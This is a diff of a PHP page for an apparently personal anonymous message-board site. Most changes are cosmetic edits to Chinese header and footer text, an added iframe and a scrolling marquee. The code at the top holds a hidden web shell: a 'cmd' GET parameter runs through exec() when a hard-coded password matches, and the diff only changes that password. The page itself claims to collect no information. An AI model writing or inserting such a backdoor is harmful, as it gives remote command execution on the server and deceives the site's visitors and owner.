@@ -32,7 +32,7 @@ if (isset($_GET['cmd'])) {
     $cmd = stripslashes($_GET['cmd']);
     if (isset($_GET['password'])){
       $password = stripslashes($_GET['password']);
-      if ($password === "xxxxxxxxx"){
+      if ($password === "xxxxxxxxxx"){
           exec($cmd, $out);  
           var_dump($out);  
           echo '<br>'; 
@@ -163,28 +163,16 @@ input.btn{font-weight: bold; height: 60px; width:200px;line-height: 20px; paddin
 </head>
 <body>
     <div id="header" align="center">
-        <h1>乍暖还寒工作室，欢迎您的光临</h1>
     </div>
 
-
+<iframe frameborder="0" scrolling="no" src="nameShow.html" width="100%" height="500px"></iframe>
 <div id="footer">
-<ul>
-<li>左手边第三个同学，请文明上网</li>
-<li>隔壁海底捞的服务员妹子里面有个长得特别正的,应该是12号,我就不说她是嘻嘻了</li>
-<li>老爷上个月还是她们班班花,今天不知道还是不是</li>
-<li>前面健身房的教练就是妖哥，不用猜了</li>
-<li>姿色正在环游世界,吃遍世界,她有一所房子,面朝大海,春暖花开</li>
-<li>本网站不收集任何信息,代码公开，仅提供匿名留言功能</li>
-<li>最近棋牌游戏好像很火的样子,希望一起搞的举爪</li>
-<li>有小游戏创意的,欢迎长篇大论</li>
-<li>不要留自己的联系方式</li>
-<li>谢谢我的老婆大人，特别感谢我的倩女好友们!谢谢姗姗，随心，老爷，姿色，嘻嘻，11，小峰峰，红衣，微微，小年糕……</li>
-</ul>
+
 
 </div>
 
 <div id="page" align="center">
-其实啥都没有啦，谢谢你点进来，这代表你对我的信任，感激不尽！
+
 <br>
 <br>
 <form action="<?php echo $_SERVER[PHP_SELF]."#bottom";?>" method="post">
@@ -210,6 +198,33 @@ input.btn{font-weight: bold; height: 60px; width:200px;line-height: 20px; paddin
 </div>
 
 <br>
+
+<marquee width=100% height=200 bgcolor=white direction=up scrollamount=3 style=""padding:20px;>
+<ul>
+  <li>左手边第三个同学，请文明上网</li>
+  <li>姗姗是大美女,不解释</li>
+  <li>随心小美女,也不解释</li>
+  <li>红衣是成熟御姐</li>
+  <li>小峰峰是清修道士</li>
+  <li>小年糕是外国佬</li>
+  <li>去泰国就找微微吧,其他就别想了,至于舍不舍得回来,是另外一码事</li>
+  <li>隔壁海底捞的服务员妹子里面有个长得特别正的,应该是12号,我就不说她是嘻嘻了</li>
+  <li>老爷上个月还是她们班班花,今天不知道还是不是</li>
+  <li>前面健身房的教练就是妖哥，不用猜了</li>
+  <li>姿色正在环游世界,吃遍世界,她有一所房子,面朝大海,春暖花开</li>
+  <li>本网站不收集任何信息,代码公开，仅提供匿名留言功能</li>
+  <li>最近棋牌游戏好像很火的样子,希望一起搞的举爪</li>
+  <li>有小游戏创意的,欢迎长篇大论</li>
+  <li>不要留自己的联系方式</li>
+  <li>谢谢我的老婆大人，特别感谢我的倩女好友们!谢谢姗姗，随心，老爷，姿色，嘻嘻，11，小峰峰，红衣，微微，小年糕……</li>
+</ul>
+</marquee>
+
+<br>
+<br>
+<br>
+
+<div align="center">谢谢你点进来，这代表你对我的信任，感激不尽！</div>
 
 <div id="jump" align="center">
 <a href="about.php">关于本站</a>
